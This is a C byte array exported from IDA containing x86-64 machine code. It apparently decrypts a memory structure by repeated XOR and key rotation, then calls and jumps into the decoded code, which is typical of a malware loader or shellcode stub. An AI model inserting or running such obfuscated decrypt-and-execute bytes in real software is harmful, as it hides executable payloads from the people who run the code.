unsigned char ida_chars[] =
{
  0x2E, 0x48,
  0x31, 0x11, 0x48, 0x31, 0x51, 0x08, 0x48, 0x31, 0x51, 0x10, 
  0x48, 0x31, 0x51, 0x18, 0x48, 0x31, 0x51, 0x20, 0x48, 0x31, 
  0x51, 0x28, 0x48, 0x31, 0x51, 0x30, 0x48, 0x31, 0x51, 0x38, 
  0x48, 0x31, 0x51, 0x40, 0x48, 0x31, 0x51, 0x48, 0x48, 0x31, 
  0x51, 0x50, 0x48, 0x31, 0x51, 0x58, 0x48, 0x31, 0x51, 0x60, 
  0x48, 0x31, 0x51, 0x68, 0x48, 0x31, 0x51, 0x70, 0x48, 0x31, 
  0x51, 0x78, 0x48, 0x31, 0x91, 0x80, 0x00, 0x00, 0x00, 0x48, 
  0x31, 0x91, 0x88, 0x00, 0x00, 0x00, 0x48, 0x31, 0x91, 0x90, 
  0x00, 0x00, 0x00, 0x48, 0x31, 0x91, 0x98, 0x00, 0x00, 0x00, 
  0x48, 0x31, 0x91, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x31, 0x91, 
  0xA8, 0x00, 0x00, 0x00, 0x48, 0x31, 0x91, 0xB0, 0x00, 0x00, 
  0x00, 0x48, 0x31, 0x91, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x31, 
  0x91, 0xC0, 0x00, 0x00, 0x00, 0x31, 0x11, 0x48, 0x8B, 0xC2, 
  0x48, 0x8B, 0xD1, 0x8B, 0x8A, 0xC4, 0x00, 0x00, 0x00, 0x48, 
  0x31, 0x84, 0xCA, 0xC0, 0x00, 0x00, 0x00, 0x48, 0xD3, 0xC8, 
  0xE2, 0xF3, 0x8B, 0x82, 0x88, 0x02, 0x00, 0x00, 0x48, 0x03, 
  0xC2, 0x48, 0x83, 0xEC, 0x28, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 
  0x28, 0x4C, 0x8B, 0x80, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 
  0x88, 0x40, 0x02, 0x00, 0x00, 0xBA, 0x01, 0x00, 0x00, 0x00, 
  0x41, 0xFF, 0xE0
};
